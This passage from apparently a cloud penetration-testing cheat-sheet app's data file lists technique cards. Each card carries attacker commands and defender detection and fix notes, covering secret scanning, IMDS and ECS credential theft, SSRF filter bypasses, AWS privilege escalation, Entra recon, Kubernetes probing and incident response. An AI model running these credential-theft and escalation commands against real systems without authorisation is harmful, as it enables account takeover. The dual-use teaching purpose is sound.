          cmds: [['Remote repo', 'trufflehog git https://github.com/<org>/<repo> --only-verified'], ['Whole org', 'trufflehog github --org=<org> --only-verified'], ['Local, all history', 'gitleaks detect --source . --log-opts="--all" --redact -v']],
          look: 'Verified findings naming the secret type and the commit; --only-verified means the key was tested live.',
          detect: 'For defenders: enable push protection and secret scanning; a clone itself is not visible to the repo owner.',
          fix: 'Rotate every exposed secret, rewrite history if needed, and turn on push protection.',
          att: 'T1552.001', refs: [['trufflehog', 'https://github.com/trufflesecurity/trufflehog'], ['gitleaks', 'https://github.com/gitleaks/gitleaks']]},
        {t: 'Container image layer secrets', provider: 'web', body: 'Secrets added then deleted in a Dockerfile still live in earlier layers; inspect layers and history rather than just the final filesystem.', level: 'intermediate',
          cmds: [['Pull the image', 'docker pull <registry>/<image>:<tag>'], ['Explore layers', 'dive <image>:<tag>'], ['Scan layers', 'trufflehog docker --image <image>:<tag> --only-verified'], ['Build history', 'docker history --no-trunc <image>:<tag>']],
          look: 'Keys/configs in an intermediate layer, or a RUN line in docker history that pipes a secret in.',
          detect: 'Registry pulls of internal images by unknown identities; image-scanning findings in the registry.',
          fix: 'Use multi-stage builds and build secrets (BuildKit --secret), never COPY secrets, and rotate anything baked in.',
          att: 'T1552'},
        {t: 'JS bundle secrets', provider: 'web', body: 'Front-end bundles ship to every visitor; they regularly contain API keys, internal URLs and tokens.', level: 'intermediate',
          cmds: [['Collect JS', 'katana -u https://target.com -jc -silent | grep "\\.js$" | sort -u > js.txt'], ['Grep for keys', 'while read u; do curl -s "$u"; done < js.txt | grep -Eo "AIza[0-9A-Za-z_-]{35}|AKIA[0-9A-Z]{16}"'], ['Scan the download', 'trufflehog filesystem ./bundles --only-verified']],
          look: 'Google API keys (AIza\u2026), AWS keys (AKIA\u2026), Firebase configs, or internal API hosts embedded in the bundle.',
          detect: 'Not visible to the target from fetching public assets; defenders should scan builds pre-deploy.',
          fix: 'Keep secrets server-side, restrict any client key by referrer/API, and scan bundles in CI.',
          att: 'T1552.001'},
        {t: 'Key formats & triage', provider: 'web', body: 'Recognising a credential\u2019s prefix tells you what it is and how to validate it before reporting.', level: 'basic',
          cmds: [['Grep common formats', 'grep -rEo "AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|ghp_[0-9A-Za-z]{36}|xox[baprs]-[0-9A-Za-z-]+|AIza[0-9A-Za-z_-]{35}" .'], ['Validate AWS', 'aws sts get-caller-identity  # with the key set'], ['Validate GitHub PAT', 'curl -s -H "Authorization: token ghp_\u2026" https://api.github.com/user'], ['Validate Slack', 'curl -s -d "token=xoxb-\u2026" https://slack.com/api/auth.test']],
          look: 'AKIA = long-lived AWS key, ASIA = temporary (needs a session token), ghp_ = GitHub PAT, xoxb- = Slack bot, AIza = Google API key.',
          detect: 'Validation calls (GetCallerIdentity, api.github.com/user) appear in the provider\u2019s logs \u2014 use a dedicated test context.',
          fix: 'Rotate confirmed-live keys immediately and prefer short-lived credentials over static ones.',
          att: 'T1552.001'}
      ]
    },
    {
      name: 'Serverless & containers', icon: 'layers', note: 'Credentials and secrets specific to Lambda, container registries and ECS/Fargate task roles. The task-role endpoint (169.254.170.2) is the container equivalent of IMDS.',
      cards: [
        {t: 'Lambda env vars & layers', provider: 'aws', body: 'Function environment variables and layers routinely hold secrets; both are readable with lambda:Get* permissions.', level: 'intermediate',
          cmds: [['List functions', 'aws lambda list-functions --query "Functions[].FunctionName"'], ['Env vars', 'aws lambda get-function-configuration --function-name <F> --query "Environment.Variables"'], ['Download code', 'aws lambda get-function --function-name <F> --query Code.Location --output text'], ['List layers', 'aws lambda list-layers']],
          look: 'Env vars with DB creds/API keys, and downloaded code containing hardcoded secrets or logic.',
          detect: 'CloudTrail GetFunctionConfiguration / GetFunction calls, especially enumerating many functions.',
          fix: 'Move secrets to Secrets Manager / SSM with encryption, and restrict lambda:Get* to specific functions.',
          att: 'T1552.007'},
        {t: 'Container registry exposure', provider: 'aws', body: 'ECR/ACR/GCR repositories or their policies can allow anonymous or cross-account pulls, exposing internal images and their secrets.', level: 'intermediate',
          cmds: [['ECR policy', 'aws ecr describe-repositories ; aws ecr get-repository-policy --repository-name <r>'], ['Public ECR', 'aws ecr-public describe-registries --region us-east-1'], ['ACR repos', 'az acr repository list --name <acr>'], ['GCR/GAR anonymous', 'curl -s https://gcr.io/v2/<project>/<image>/tags/list']],
          look: 'A repository policy with a wildcard principal, or an anonymous tags/list response = images pullable without auth.',
          detect: 'Registry access logs showing anonymous or external pulls; policy changes adding wildcard principals.',
          fix: 'Make repositories private, scope pull policies to known principals, and scan images for secrets.',
          att: 'T1530'},
        {t: 'ECS task role credentials', provider: 'aws', body: 'ECS/Fargate tasks fetch their IAM role credentials from 169.254.170.2 via a relative URI in an env var \u2014 code-exec in a task yields that role.', level: 'advanced',
          cmds: [['Relative-URI variant', 'curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"'], ['Full-URI variant (Fargate)', 'curl -s "$AWS_CONTAINER_CREDENTIALS_FULL_URI" -H "Authorization: $AWS_CONTAINER_AUTHORIZATION_TOKEN"'], ['Use them', 'export AWS_ACCESS_KEY_ID=\u2026 AWS_SECRET_ACCESS_KEY=\u2026 AWS_SESSION_TOKEN=\u2026 ; aws sts get-caller-identity']],
          look: 'A JSON blob with AccessKeyId/SecretAccessKey/Token for the task role; its policy sets what you can reach.',
          detect: 'Task-role credentials used from outside the task (different IP/UA) in CloudTrail; app reads of 169.254.170.2.',
          fix: 'Give task roles least privilege, treat SSRF/RCE in a task as credential compromise, and restrict egress.',
          att: 'T1552.005'}
      ]
    },
    {
      name: 'Cloud incident response', icon: 'siren', note: 'For responders: isolate, preserve evidence, revoke access and hunt the audit trail, per provider. These are defender commands \u2014 run them with proper authorisation during an investigation.',
      cards: [
        {t: 'AWS incident response', provider: 'aws', body: 'Isolate the instance, snapshot for evidence, revoke issued sessions, and query the trail for the attacker\u2019s actions.', level: 'advanced',
          cmds: [['Isolate (deny-all SG)', 'aws ec2 modify-instance-attribute --instance-id <id> --groups <isolation-sg>'], ['Snapshot the volume', 'aws ec2 create-snapshot --volume-id <vol> --description "IR evidence"'], ['Revoke role sessions', 'aws iam put-role-policy --role-name <role> --policy-name Revoke --policy-document file://revoke.json  # Deny with DateLessThan aws:TokenIssueTime'], ['Hunt in CloudTrail Lake', 'aws cloudtrail start-query --query-statement "SELECT eventTime,eventName,userIdentity.arn FROM <eds-id> WHERE eventName IN (\'CreateAccessKey\',\'StopLogging\',\'ConsoleLogin\') ORDER BY eventTime DESC"']],
          look: 'The isolation SG with no rules, a completed snapshot id, and a query result timeline of suspicious events.',
          detect: 'These are your own IR actions; correlate with GuardDuty findings and the trail timeline.',
          fix: 'After containment, rotate all exposed credentials, remove attacker persistence, and review IAM for added keys/roles.',
          att: 'M1018', refs: [['AWS IR guide', 'https://docs.aws.amazon.com/whitepapers/latest/aws-security-incident-response-guide/welcome.html']]},
        {t: 'Entra ID incident response', provider: 'azure', body: 'Revoke the user\u2019s tokens, enumerate OAuth grants for persistence, and search the unified audit log for the attacker\u2019s activity.', level: 'advanced',
          cmds: [['Revoke sessions', 'az rest --method POST --uri "https://graph.microsoft.com/v1.0/users/<id>/revokeSignInSessions"'], ['Disable the account', 'az ad user update --id <UPN> --account-enabled false'], ['List OAuth grants', 'Get-MgOauth2PermissionGrant -All'], ['Search audit log', 'Search-UnifiedAuditLog -StartDate <d> -EndDate <d> -Operations "Consent to application.","Add service principal."']],
          look: 'Unexpected OAuth grants / service principals (persistence), and sign-ins or consents from attacker IPs in the audit log.',
          detect: 'Entra sign-in and audit logs; risky sign-in and risky user detections in Identity Protection.',
          fix: 'Revoke tokens and grants, reset credentials and MFA, remove rogue apps/SPs, and close the Conditional Access gap used.',
          att: 'M1018'},
        {t: 'GCP incident response', provider: 'gcp', body: 'Hunt the audit log for IAM and token activity, disable attacker service-account keys, and snapshot disks for evidence.', level: 'advanced',
          cmds: [['Hunt IAM/token events', 'gcloud logging read \'protoPayload.methodName="SetIamPolicy" OR protoPayload.methodName:"generateAccessToken"\' --limit 50 --format json'], ['List SA keys', 'gcloud iam service-accounts keys list --iam-account <sa-email>'], ['Disable a key', 'gcloud iam service-accounts keys disable <key-id> --iam-account <sa-email>'], ['Snapshot a disk', 'gcloud compute disks snapshot <disk> --snapshot-names ir-evidence --zone <z>']],
          look: 'SetIamPolicy grants to attacker principals, generateAccessToken bursts, and unfamiliar SA keys to disable.',
          detect: 'Cloud Audit Logs (Admin Activity, Data Access) and SCC findings.',
          fix: 'Disable/delete rogue keys and grants, rotate exposed SAs, and tighten org policy and IAM afterwards.',
          att: 'M1018'},
        {t: 'Kubernetes incident response', provider: 'k8s', body: 'Quarantine the pod and node, preserve logs, and query the API-server audit log for the attacker\u2019s calls.', level: 'advanced',
          cmds: [['Recent events', 'kubectl get events -A --sort-by=.lastTimestamp'], ['Cordon the node', 'kubectl cordon <node>'], ['Isolate the pod', 'kubectl label pod <pod> quarantine=true ; kubectl apply -f netpol-denyall.yaml'], ['Preserve logs & hunt audit', 'kubectl logs <pod> --all-containers --previous ; jq \'select(.verb=="create" and .objectRef.resource=="pods")\' /var/log/kubernetes/audit.log']],
          look: 'Audit entries creating privileged pods/bindings, exec into containers, or secret reads by an unexpected subject.',
          detect: 'API-server audit log, Falco/runtime alerts, and the events timeline.',
          fix: 'Delete attacker workloads and bindings, rotate affected SA tokens and secrets, and fix the RBAC/PSA gap used.',
          att: 'M1018'}
      ]
    }
  ],
  add: {
    'Recon & enumeration': [
      {t: 'Cloud asset discovery', provider: 'web', body: 'Find a target\u2019s cloud footprint \u2014 buckets, blobs, apps and registries \u2014 across providers from the organisation name.', level: 'basic',
        cmds: [['Multi-cloud sweep', 'cloud_enum -k <company> -k <company>-dev -k <company>-prod'], ['S3 names', 'ffuf -u https://<company>-FUZZ.s3.amazonaws.com -w env-words.txt -fc 400'], ['Azure tenant', 'curl -s "https://login.microsoftonline.com/<company>.onmicrosoft.com/.well-known/openid-configuration" | jq .issuer']],
        look: 'Named buckets/containers that list or 403 (exist), and the tenant id confirming an Azure/Entra presence.',
        detect: 'Mostly passive; bucket name guessing shows as 403/NoSuchBucket in provider access logs if logging is on.',
        fix: 'Avoid predictable resource names, block public access by default, and monitor for enumeration.',
        att: 'T1526', refs: [['cloud_enum', 'https://github.com/initstring/cloud_enum']]},
      {t: 'Subdomain takeover', provider: 'web', body: 'A DNS record pointing at a deprovisioned cloud resource (S3/Azure/GitHub Pages) can be claimed by registering that resource.', level: 'intermediate',
        cmds: [['Find dangling CNAMEs', 'subfinder -d target.com -silent | httpx -silent -cname | grep -Ei "s3|azurewebsites|github.io|herokudns|cloudfront"'], ['Fingerprint takeover', 'nuclei -l live-hosts.txt -t http/takeovers/'], ['Confirm the claim', 'dig CNAME sub.target.com +short']],
        look: 'A CNAME to a cloud service returning its "no such bucket/app" error page = the backing resource is free to claim.',
        detect: 'For defenders: dangling DNS records; the claim itself is a new resource created in an attacker account.',
        fix: 'Remove DNS records when you delete the resource, and audit for dangling CNAMEs regularly.',
        att: 'T1584.001'}
    ],
    'Finding & triaging bugs': [
      {t: 'GraphQL & API abuse', provider: 'web', body: 'GraphQL endpoints often expose the full schema via introspection and lack per-field authorization, enabling IDOR-style reads.', level: 'intermediate',
        cmds: [['Introspection', 'curl -s https://target.com/graphql -H "Content-Type: application/json" -d \'{"query":"{__schema{types{name fields{name}}}}"}\''], ['Map with a tool', 'graphql-cop -t https://target.com/graphql'], ['Batch/alias abuse', '# send many aliased queries in one request to bypass rate limits / brute values']],
        look: 'A full schema from introspection, queries returning other users\u2019 objects, or mutations usable without the right role.',
        detect: 'WAF/app logs: large introspection queries, heavily aliased/batched requests, one token touching many object ids.',
        fix: 'Disable introspection in production, enforce field-level authorization, and rate-limit by operation cost.',
        att: 'T1190'}
    ],
    'Secrets & exposure': [
      {t: 'Docker image layer secrets', provider: 'web', body: 'Public or pulled container images frequently carry secrets in intermediate layers even after a later RUN deletes them.', level: 'intermediate',
        cmds: [['Explore layers', 'dive <image>:<tag>'], ['Scan the image', 'trufflehog docker --image <image>:<tag> --only-verified'], ['Build history', 'docker history --no-trunc <image>:<tag>']],
        look: 'Credentials/config in an early layer, or a build step that pipes in a token visible in docker history.',
        detect: 'Registry pulls of internal images by unknown identities; pre-deploy image scanning findings.',
        fix: 'Use multi-stage builds and BuildKit build secrets, never COPY secrets, and rotate baked-in keys.',
        att: 'T1552'},
      {t: 'Cloud key formats & triage', provider: 'web', body: 'Knowing a credential\u2019s prefix lets you classify and safely validate it before reporting.', level: 'basic',
        cmds: [['Grep for formats', 'grep -rEo "AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}|ghp_[0-9A-Za-z]{36}|xox[baprs]-[0-9A-Za-z-]+" .'], ['Validate AWS', 'aws sts get-caller-identity'], ['Validate Google key', 'curl -s "https://maps.googleapis.com/maps/api/geocode/json?address=x&key=AIza\u2026"']],
        look: 'AKIA (long-lived AWS), ASIA (temporary, needs session token), AIza (Google API), ghp_ (GitHub PAT), xoxb- (Slack bot).',
        detect: 'Validation calls land in provider logs; use a dedicated test context so you do not pollute the target\u2019s telemetry.',
        fix: 'Rotate live keys at once and prefer short-lived credentials over static ones.',
        att: 'T1552.001'}
    ],
    'Metadata & SSRF': [
      {t: 'SSRF to IMDS: bypass & IMDSv2', provider: 'aws', body: 'When an SSRF reaches an EC2 host, IMDSv1 leaks credentials with a single GET; IMDSv2 needs a PUT for a token first, which many SSRF primitives cannot send.', level: 'advanced',
        cmds: [['IMDSv1 direct', 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/'], ['Common filter bypasses', '# http://169.254.169.254.nip.io/  ·  http://[::ffff:169.254.169.254]/  ·  decimal 2852039166  ·  redirect via your host'], ['IMDSv2 (needs PUT)', 'TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 300")']],
        look: 'A role name then temporary AccessKeyId/SecretAccessKey/Token in the SSRF response; IMDSv2 blocks GET-only SSRF.',
        detect: 'App-process reads of 169.254.169.254; the CloudWatch MetadataNoToken metric indicates IMDSv1 use.',
        fix: 'Enforce IMDSv2 (HttpTokens required) with hop-limit 1, and block link-local egress from app servers.',
        att: 'T1552.005', refs: [['IMDSv2 docs', 'https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html']]}
    ],
    'AWS enumeration': [
      {t: 'Automated audit (ScoutSuite/Prowler/CloudFox)', provider: 'aws', body: 'Once you have keys, a scanner maps the whole account\u2019s misconfigurations and reachable resources far faster than by hand.', level: 'intermediate',
        cmds: [['ScoutSuite', 'scout aws --profile <p>'], ['Prowler', 'prowler aws -p <p>'], ['CloudFox inventory', 'cloudfox aws --profile <p> all-checks'], ['Permission enumeration', 'pacu  # run iam__enum_permissions']],
        look: 'An HTML/JSON report of public resources, over-permissive policies and escalation paths to triage first.',
        detect: 'Bursts of Describe*/List*/Get* across many services in CloudTrail from one principal in a short window.',
        fix: 'Least privilege, deny unused services, and alert on broad enumeration patterns.',
        att: 'T1526', refs: [['ScoutSuite', 'https://github.com/nccgroup/ScoutSuite'], ['Prowler', 'https://github.com/prowler-cloud/prowler']]},
      {t: 'STS federation & session tokens', provider: 'aws', body: 'STS turns long-lived keys into temporary sessions and federated URLs; useful for scoping, for MFA sessions, and for a browser console from CLI keys.', level: 'intermediate',
        cmds: [['Session token', 'aws sts get-session-token --duration-seconds 3600'], ['MFA session', 'aws sts get-session-token --serial-number <mfa-arn> --token-code <otp>'], ['Federated console URL', 'aws sts get-federation-token --name s --policy file://p.json  # then build a signin URL']],
        look: 'Temporary ASIA\u2026 credentials with a session token; a federation token can be turned into a console sign-in link.',
        detect: 'CloudTrail GetSessionToken / GetFederationToken; console logins from federated sessions in unusual regions.',
        fix: 'Require MFA for sensitive actions, keep session durations short, and alert on federation-token use.',
        att: 'T1550.001'}
    ],
    'AWS privilege escalation': [
      {t: 'Set a console password', provider: 'aws', body: 'iam:CreateLoginProfile / UpdateLoginProfile lets you set a console password on a user that has one missing or reset it, enabling console sign-in.', level: 'advanced',
        cmds: [['Create a login profile', 'aws iam create-login-profile --user-name <target> --password \'<Str0ngP@ss>\' --no-password-reset-required'], ['Reset an existing one', 'aws iam update-login-profile --user-name <target> --password \'<Str0ngP@ss>\''], ['Then sign in', '# https://<account>.signin.aws.amazon.com/console']],
        look: 'A console password set on a more privileged user you do not own, letting you log in as them.',
        detect: 'CloudTrail CreateLoginProfile / UpdateLoginProfile for a user other than the caller.',
        fix: 'Deny iam:*LoginProfile broadly, require MFA for console, and alert on login-profile changes.',
        att: 'T1098.001'},
      {t: 'AssumeRole chaining', provider: 'aws', body: 'sts:AssumeRole across a chain of roles that each trust the previous one lets you walk toward a privileged role; map the graph first.', level: 'advanced',
        cmds: [['Map privesc graph', 'pmapper graph create ; pmapper query "preset privesc *"'], ['Assume a role', 'aws sts assume-role --role-arn <role-arn> --role-session-name s'], ['Chain', '# export the returned creds, then assume the next role they can reach']],
        look: 'A pmapper path from your principal through intermediate roles to admin; each AssumeRole returns usable creds.',
        detect: 'CloudTrail AssumeRole sequences hopping between roles/accounts in a short window.',
        fix: 'Tighten role trust policies, remove unneeded AssumeRole grants, and review the privesc graph regularly.',
        att: 'T1548', refs: [['PMapper', 'https://github.com/nccgroup/PMapper']]}
    ],
    'Azure & GCP enum': [
      {t: 'Entra graph recon (AzureHound/ROADtools)', provider: 'azure', body: 'Pull the whole directory \u2014 users, groups, apps, roles and relationships \u2014 to find paths to Global Admin the way BloodHound does on-prem.', level: 'intermediate',
        cmds: [['AzureHound', 'azurehound -u <user> -p <pass> list -t <tenant> -o output.json'], ['ROADrecon gather', 'roadrecon auth -u <user> -p <pass> ; roadrecon gather'], ['Explore', 'roadrecon gui  # or import output.json into BloodHound']],
        look: 'An attack graph showing control edges (owner, member, app role) that lead to Global Admin or privileged apps.',
        detect: 'Large Microsoft Graph read volumes from one principal; ROADtools/AzureHound user-agents in sign-in logs.',
        fix: 'Least-privilege directory roles, review app ownerships and role-eligible paths, and use PIM for privileged roles.',
        att: 'T1087.004', refs: [['AzureHound', 'https://github.com/BloodHoundAD/AzureHound']]},
      {t: 'GCP automated audit (ScoutSuite/Prowler)', provider: 'gcp', body: 'Scan the project/org for public resources, broad IAM and escalation paths in one pass.', level: 'intermediate',
        cmds: [['ScoutSuite', 'scout gcp --user-account --project-id <project>'], ['Prowler', 'prowler gcp --project-ids <project>'], ['IAM escalation review', '# look for setIamPolicy, actAs, serviceAccountKeys.create grants']],
        look: 'A report of public buckets, primitive roles (Owner/Editor), and SA key/impersonation grants to triage.',
        detect: 'Bursts of *.list / getIamPolicy across services in Cloud Audit Logs from one identity.',
        fix: 'Replace primitive roles with least privilege, restrict setIamPolicy/actAs, and disable SA key creation.',
        att: 'T1526'}
    ],
    'Kubernetes & containers': [
      {t: 'External cluster scan', provider: 'k8s', body: 'From outside or inside the network, probe for exposed Kubernetes components \u2014 API server, kubelet, etcd, dashboard \u2014 and known RBAC weaknesses.', level: 'intermediate',
        cmds: [['kube-hunter', 'kube-hunter --remote <node-ip>'], ['In-pod enumeration', 'peirates  # interactive: token theft, node escape, RBAC checks'], ['Port probe', 'nmap -p 6443,10250,10255,2379,8001 <node-ip>']],
        look: 'Findings for anonymous kubelet (10250), read-only kubelet (10255), open etcd (2379), or an unauthenticated API/dashboard.',
        detect: 'Connection attempts to those ports from unexpected sources; kube-hunter/peirates traffic patterns.',
        fix: 'Firewall control-plane and kubelet ports, disable anonymous auth, and keep the dashboard off public networks.',
        att: 'T1046', refs: [['kube-hunter', 'https://github.com/aquasecurity/kube-hunter'], ['peirates', 'https://github.com/inguardians/peirates']]}
    ],
    'Defence & forensics': [
      {t: 'Entra sign-in & audit hunt', provider: 'azure', body: 'The Entra sign-in and audit logs are where identity attacks show up \u2014 device-code sign-ins, legacy auth, consent grants and risky detections.', level: 'intermediate',
        cmds: [['Risky sign-ins (Graph)', 'az rest --method GET --uri "https://graph.microsoft.com/v1.0/identityProtection/riskyUsers"'], ['Audit directory changes', 'az rest --method GET --uri "https://graph.microsoft.com/v1.0/auditLogs/directoryAudits?\\$top=50"'], ['UAL consent search', 'Search-UnifiedAuditLog -StartDate <d> -EndDate <d> -Operations "Consent to application."']],
        look: 'Device-code or legacy-auth sign-ins, impossible travel, new OAuth consents, and risky-user detections.',
        detect: 'This is the detection; feed these logs to a SIEM and alert on the high-signal operations.',
        fix: 'Block legacy auth and device code where unneeded, require admin consent, and act on Identity Protection risk.',
        att: 'T1078.004'}
    ],
    'CTF & misc': [
      {t: 'Cloud CTF quickstart', provider: 'web', body: 'A fast triage order when a cloud CTF or box hands you access: identify the credential, confirm identity, then enumerate and look for the flag.', level: 'basic',
        cmds: [['Classify the creds', '# AKIA/ASIA=AWS · eyJ...=JWT (Entra/OIDC) · ya29.=Google OAuth · kubeconfig=K8s'], ['Confirm AWS/GCP/Azure', 'aws sts get-caller-identity ; gcloud auth list ; az account show'], ['Grab easy wins', 'aws secretsmanager list-secrets ; aws s3 ls ; kubectl get secrets -A'], ['Reach for metadata', '# SSRF/RCE on a VM? hit IMDS (see Metadata & SSRF)']],
        look: 'A live identity from the confirm step, then a secret/bucket/parameter that holds the flag or the next credential.',
        detect: 'Not applicable \u2014 CTF context; on real engagements these calls are logged as above.',
        fix: 'Not applicable \u2014 practice/scoring environment.',
        att: 'T1078'}
    ]
  },
  enrich: {
    'Subdomains & assets': {level: 'basic', look: 'Resolving hosts with titles, status codes and detected tech; watch for wildcard DNS that makes everything resolve.', detect: 'Passive sources touch nothing on the target; active resolution/probing shows as DNS queries and 200/404 bursts with a tool user-agent in web logs.', fix: 'Reduce exposed subdomains, remove stale records, and monitor certificate transparency for new names.'},
    'Endpoints & URLs': {level: 'basic', look: 'Parameters, API paths, old endpoints and JS files \u2014 the raw material for parameter and access-control testing.', detect: 'Crawling appears as request bursts (200/404) with a scanner user-agent in access logs; archived-URL pulls touch third parties, not the target.', fix: 'Remove dead endpoints, require auth on APIs, and keep secrets out of client-reachable URLs.'},
    'Content & vhost discovery': {level: 'basic', look: '200/403/401 on hidden paths, backup and config files, and virtual hosts that answer differently from the default.', detect: 'High-rate 404s and a fuzzing user-agent in web/WAF logs; many requests to one host with varying Host headers.', fix: 'Remove backups from the webroot, 404 unknown vhosts, and rate-limit/deny fuzzing patterns.'},
    'Ports & services': {level: 'basic', look: 'Open ports with service and version banners, and HTTP responding on non-standard ports.', detect: 'SYN sweeps and version probes in firewall/IDS logs; connection spikes from one source.', fix: 'Close unused ports, restrict by security group/NSG/firewall, and front services with a gateway.'},
    'Automated nuclei sweep': {level: 'basic', look: 'Template matches flagged by severity \u2014 known CVEs, exposed files and misconfigurations to verify by hand.', detect: 'Many templated requests with a nuclei user-agent and 404/500 spikes across paths.', fix: 'Patch flagged CVEs, remove exposed files, and tune a WAF for templated scanning.'},
    'Access control & IDOR': {level: 'intermediate', look: 'User B\u2019s data returned when authenticated as user A, or a privileged action accepted with a low-privilege token.', detect: 'One session touching many sequential or others\u2019 object ids; 403\u2192200 anomalies for the same principal.', fix: 'Enforce per-object, server-side authorization on every request; never trust client-supplied ids.'},
    'SSRF (to cloud metadata)': {level: 'advanced', look: 'Internal or metadata responses reflected back, or an out-of-band callback from the server to your listener.', detect: 'Outbound requests from an app host to 169.254.169.254, link-local or internal IPs; metadata reads by an app process.', fix: 'Enforce IMDSv2, block link-local egress, and allowlist/validate any server-side URL fetcher.'},
    'Injection & template': {level: 'advanced', look: '49 from a 7*7 probe, SQL errors or boolean/time differences, or command output echoed back.', detect: 'WAF/query-log anomalies, database errors, and unusual child processes spawned by the web user.', fix: 'Parameterise queries, sandbox or avoid templating of user input, and never pass input to a shell.'},
    'Auth & session': {level: 'intermediate', look: 'alg=none accepted, a weak JWT HMAC secret that cracks, predictable reset tokens, or a session id that survives login.', detect: 'JWTs signed with none/weak keys, many password-reset requests, and host-header anomalies in reset links.', fix: 'Rotate the session id on login, verify JWT alg and use strong secrets, and bind reset tokens to the user and a short TTL.'},
    'Secrets in code & JS': {level: 'basic', look: 'Verified, live keys and tokens in repository history or front-end bundles \u2014 --only-verified means tested.', detect: 'Not visible to the target from a clone; pushes to public repos are caught by provider secret scanning if enabled.', fix: 'Rotate every leaked secret, enable push protection, and keep secrets server-side.'},
    'Exposed files & config': {level: 'basic', look: '.env, .git/HEAD, backups or config files returning 200 \u2014 often a direct path to credentials.', detect: 'Requests to /.git/, /.env and backup extensions in access logs.', fix: 'Block dotfiles and backup extensions at the web server and keep them out of the webroot.'},
    'Public cloud storage': {level: 'intermediate', look: 'Bucket/container listing or object downloads succeeding with no credentials.', detect: 'S3 server-access or CloudTrail data events with an anonymous/no principal; equivalent GCS/Azure access logs.', fix: 'Enable Block Public Access, scope bucket policies, and alert on anonymous reads.'},
    'AWS instance metadata (IMDS)': {level: 'advanced', look: 'A role name, then temporary AccessKeyId/SecretAccessKey/Token \u2014 short-lived keys for that role.', detect: 'App-process reads of 169.254.169.254; the CloudWatch MetadataNoToken metric reveals lingering IMDSv1 use.', fix: 'Enforce IMDSv2 (HttpTokens required) with hop-limit 1 and restrict link-local egress.'},
    'Azure instance metadata (IMDS)': {level: 'advanced', look: 'A JWT access_token for the VM managed identity; its roles decide what it can reach.', detect: 'Unexpected token requests to the IMDS identity endpoint and managed-identity sign-ins in Entra.', fix: 'Give the managed identity least privilege and restrict egress to the metadata endpoint.'},
    'GCP instance metadata': {level: 'advanced', look: 'An OAuth token and its scopes \u2014 cloud-platform scope means near-full project access.', detect: 'App reads of metadata.google.internal and the service-account token appearing in audit logs for other resources.', fix: 'Use a least-privilege SA, narrow access scopes, and apply a metadata firewall.'},
    'Identity & account': {level: 'basic', look: 'The account id and the user/role ARN, confirming the keys are valid and who they belong to.', detect: 'GetCallerIdentity in CloudTrail from a new IP/user-agent is a useful first-seen signal.', fix: 'Not a vulnerability itself; alert on first-seen callers and unusual source IPs.'},
    'What can these keys do': {level: 'intermediate', look: 'Attached and inline policies and the allowed actions reported by simulate-principal-policy.', detect: 'Bursts of iam:List*/Get* and SimulatePrincipalPolicy calls from one principal.', fix: 'Grant least privilege and restrict IAM read/simulate permissions where not needed.'},
    'S3 buckets': {level: 'intermediate', look: 'Bucket names, object listings and policies; --no-sign-request working means public access.', detect: 'ListBuckets/GetObject spikes and anonymous access in S3/CloudTrail logs.', fix: 'Enable Block Public Access, scope bucket policies, and encrypt sensitive objects.'},
    'Secrets & parameters': {level: 'intermediate', look: 'Plaintext secret values, DB credentials or flags from Secrets Manager / SSM.', detect: 'GetSecretValue and GetParameter (WithDecryption) in CloudTrail, especially bulk reads.', fix: 'Scope secret access tightly, rotate secrets, and alert on mass retrieval.'},
    'Lambda & compute': {level: 'intermediate', look: 'Environment variables with secrets, downloadable code, and EC2 user-data scripts.', detect: 'GetFunctionConfiguration/GetFunction and DescribeInstanceAttribute (userData) calls.', fix: 'Move secrets to Secrets Manager/SSM and restrict describe/get permissions.'},
    'Create a new access key': {level: 'advanced', look: 'A second active access key on a user you do not own \u2014 full use of that identity.', detect: 'iam:CreateAccessKey where the user-name differs from the caller.', fix: 'Deny CreateAccessKey broadly, alert on it, and rotate/remove unexpected keys.'},
    'Attach an admin policy': {level: 'advanced', look: 'AdministratorAccess (or equivalent) now attached to your principal.', detect: 'AttachUserPolicy/AttachRolePolicy with an admin policy ARN in CloudTrail.', fix: 'Use permission boundaries and SCPs to prevent self-escalation to admin.'},
    'Pass a role to a service': {level: 'advanced', look: 'A service (Lambda/EC2/Glue) now running as a more privileged role you can drive.', detect: 'iam:PassRole appearing in CreateFunction/RunInstances/CreateJob request parameters.', fix: 'Scope iam:PassRole by resource ARN and a PassedToService condition.'},
    'New policy version': {level: 'advanced', look: 'A managed policy\u2019s default version rewritten to allow all actions.', detect: 'CreatePolicyVersion followed by SetDefaultPolicyVersion in CloudTrail.', fix: 'Deny these actions on attached policies and enforce permission boundaries.'},
    'Azure \u2014 who and what': {level: 'basic', look: 'The signed-in account, subscriptions, role assignments, Key Vaults and storage keys.', detect: 'Entra audit and Activity log reads; storage account ListKeys events.', fix: 'Apply least privilege and PIM, and alert on ListKeys and vault access.'},
    'Azure \u2014 managed identity token to data': {level: 'advanced', look: 'A resource-scoped token (storage or Key Vault) that az then uses for data access.', detect: 'Token requests to the IMDS identity endpoint and managed-identity data-plane access.', fix: 'Scope managed-identity roles, use Key Vault RBAC, and restrict egress.'},
    'GCP \u2014 who and what': {level: 'basic', look: 'The active account, projects, service accounts, IAM policy, buckets and secrets.', detect: 'get-iam-policy and secret-access calls in Cloud Audit Logs.', fix: 'Grant least privilege and restrict who can read IAM and secrets.'},
    'GCP \u2014 impersonate a service account': {level: 'advanced', look: 'An access token minted for a more privileged service account.', detect: 'GenerateAccessToken/GenerateIdToken on iamcredentials in the audit log.', fix: 'Remove serviceAccountTokenCreator or scope it to specific SAs; alert on token minting.'},
    'Service-account token from a pod': {level: 'advanced', look: 'A mounted JWT the API server accepts; kubectl auth can-i --list shows what it allows.', detect: 'API-server audit events from the SA originating from an unusual pod/IP.', fix: 'Set automountServiceAccountToken: false where unneeded and keep SA RBAC minimal.'},
    'Enumerate the cluster': {level: 'intermediate', look: 'Readable secrets, pods and nodes \u2014 a secret often holds the flag or more credentials.', detect: 'list/get on secrets across namespaces in the API-server audit log.', fix: 'Restrict secret reads via RBAC and encrypt secrets at rest.'},
